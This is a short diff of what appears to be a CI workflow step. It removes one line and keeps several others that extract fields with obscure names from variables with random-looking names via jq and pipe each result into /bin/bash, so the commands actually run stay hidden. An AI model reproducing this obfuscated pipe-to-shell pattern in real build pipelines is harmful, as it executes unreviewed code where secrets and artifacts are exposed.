@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$jzy4" | jq -r .iis0547 | /bin/bash
           printf '%s' "$iib691" | jq -r .pa0261 | /bin/bash
           echo $r9 | jq -r .pb401 | /bin/bash
-          printf '%s' "$fsnj39400" | jq -r .ofroi45 | /bin/bash
           printf '%s' "$klmhg46" | jq -r .vf3422 | /bin/bash
 
       - name: Persist output
